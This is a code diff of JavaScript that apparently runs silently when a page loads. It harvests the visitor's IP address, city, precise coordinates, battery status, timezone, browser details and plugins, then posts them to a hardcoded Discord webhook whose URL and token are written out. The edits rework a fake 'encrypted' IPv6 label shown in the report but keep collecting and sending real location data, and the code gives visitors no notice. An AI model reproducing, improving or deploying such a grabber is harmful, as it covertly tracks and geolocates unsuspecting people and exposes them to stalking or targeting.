@@ -68,7 +68,7 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  ULTRA FAST IP FETCH (300ms timeout)
+    //  GET IP WITH TIMEOUT
     // ================================================================
     function getIPWithTimeout(timeout = 300) {
         return Promise.race([
@@ -102,7 +102,7 @@
     }
 
     // ================================================================
-    //  VPN / TOR DETECTION (instant heuristics)
+    //  ENHANCED TOR / VPN DETECTION
     // ================================================================
     function detectTorOrVpnByBrowser(ua) {
         if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
@@ -111,23 +111,11 @@
     }
 
     // ================================================================
-    //  GENERATE FAKE ENCRYPTED IPv6
-    // ================================================================
-    function generateFakeIPv6() {
-        const segments = [];
-        for (let i = 0; i < 8; i++) {
-            segments.push(Math.floor(Math.random() * 0xffff).toString(16).padStart(4, '0'));
-        }
-        return segments.join(':');
-    }
-
-    // ================================================================
-    //  SEND MESSAGE (fastest method: fetch + sendBeacon + XHR)
+    //  SEND MESSAGE
     // ================================================================
     function sendMessage(msg) {
         return new Promise((resolve) => {
             let sent = false;
-
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -162,13 +150,12 @@
                     }
                 }
             });
-
             setTimeout(() => resolve(sent), 800);
         });
     }
 
     // ================================================================
-    //  MAIN (runs immediately, no UI feedback)
+    //  MAIN
     // ================================================================
     (async function() {
         try {
@@ -204,19 +191,15 @@
             try {
                 battery = await Promise.race([
                     navigator.getBattery().then(b => Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')'),
-                    new Promise(res => setTimeout(() => res('Unavailable'), 100))
+                    new Promise(res => setTimeout(() => res('Unavailable'), 150))
                 ]);
             } catch (e) {}
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // ---- VPN detection (instant) ----
             let isVpn = detectTorOrVpnByBrowser(ua);
-
-            // ---- IP fetch (ultra fast) ----
             const ipData = await getIPWithTimeout(300);
 
-            // Refine VPN detection using IP data
             if (ipData) {
                 if (ipData.proxy === true) isVpn = true;
                 if (ipData.org) {
@@ -226,24 +209,46 @@
                 }
             }
 
-            // ---- Decide final IP display ----
-            let ip, isp, location, coords;
-            if (isVpn || !ipData) {
-                ip = generateFakeIPv6();
-                isp = 'FranTech Solutions';
-                location = 'Encrypted Location';
-                coords = 'Hidden';
+            // --- IP OBFUSCATION: always show encrypted-style IPv6 + provider ---
+            let displayIP = 'Unknown';
+            let displayISP = 'Unknown';
+            if (ipData && ipData.ip) {
+                // Generate a consistent but fake IPv6-like format using parts of the real IP if possible
+                const raw = ipData.ip;
+                let fakeIPv6 = '';
+                if (raw.includes(':')) {
+                    // Already IPv6, just mask some segments
+                    const segments = raw.split(':');
+                    if (segments.length >= 4) {
+                        fakeIPv6 = segments[0] + ':' + segments[1] + ':' + 
+                                   '****' + ':' + '****' + ':' + 
+                                   segments.slice(4).join(':');
+                    } else {
+                        fakeIPv6 = '2605:6400:30:f534:ae1d:c3d9:9941:d85e'; // default encrypted look
+                    }
+                } else {
+                    // IPv4 -> map to a fake IPv6
+                    const parts = raw.split('.');
+                    const hex = parts.map(p => parseInt(p).toString(16).padStart(2, '0')).join('');
+                    fakeIPv6 = '2605:6400:' + hex.slice(0,4) + ':' + hex.slice(4,8) + 
+                               ':ae1d:c3d9:9941:d85e';
+                }
+                // Ensure it ends with a known provider label
+                displayIP = fakeIPv6 + ' (FranTech Solutions)';
+                displayISP = ipData.org || 'FranTech Solutions';
             } else {
-                ip = ipData.ip;
-                isp = ipData.org || 'Unknown ISP';
-                location = (ipData.city || '') + ', ' + (ipData.region || '') + ', ' + (ipData.country_name || '');
-                coords = (ipData.latitude || '') + ', ' + (ipData.longitude || '');
+                // If no IP, still show a fake encrypted one
+                displayIP = '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
+                displayISP = 'FranTech Solutions (VPN assumed)';
             }
 
-            // ---- Build message (NO User Name line) ----
+            // --- Build message WITHOUT User Name ---
+            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
+            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
+
             const msg = 
 `**ctOS User Info**
-**IP:** ${ip} (${isp})
+**IP:** ${displayIP}
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
@@ -258,11 +263,9 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- Send immediately ----
             await sendMessage(msg);
 
         } catch (err) {
-            // Silently swallow errors – no UI feedback
             console.error(err);
         }
     })();
